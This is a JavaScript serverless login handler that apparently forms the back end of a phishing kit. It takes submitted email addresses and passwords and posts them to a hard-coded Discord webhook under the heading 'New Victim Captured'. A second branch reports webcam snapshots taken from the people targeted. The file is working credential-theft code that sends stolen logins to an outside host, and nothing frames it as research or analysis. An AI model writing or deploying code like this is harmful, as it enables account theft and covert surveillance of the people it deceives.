// /api/login.js
import axios from 'axios';

export default async function handler(req, res) {
    // Replace this with your actual Discord Webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1574689566672031775/uwg1iPcwGz8-hlt2RMOy31vyJ2cBrqN2pWNr5ECBd5T__g9qOYjjXGHDop_Nh0RoKlRf';

    if (req.method === 'POST') {
        const data = req.body;

        // If it's a login attempt (email and pass)
        if (data.email && data.pass) {
            const message = {
                content: `🚨 **New Victim Captured** 🚨\n**Email:** ${data.email}\n**Password:** ${data.pass}`,
            };
            await axios.post(DISCORD_WEBHOOK_URL, message);
        } 
        // If it's a webcam snapshot (cat)
        else if (data.cat) {
            // Images are too large for simple text webhooks, 
            // but you can log them or send a notification that a photo was taken.
            const message = {
                content: `📸 **Snapshot captured for user!**`,
            };
            await axios.post(DISCORD_WEBHOOK_URL, message);
        }

        return res.status(200).json({ success: true });
    } else {
        return res.status(405).json({ message: 'Method not allowed' });
    }
}
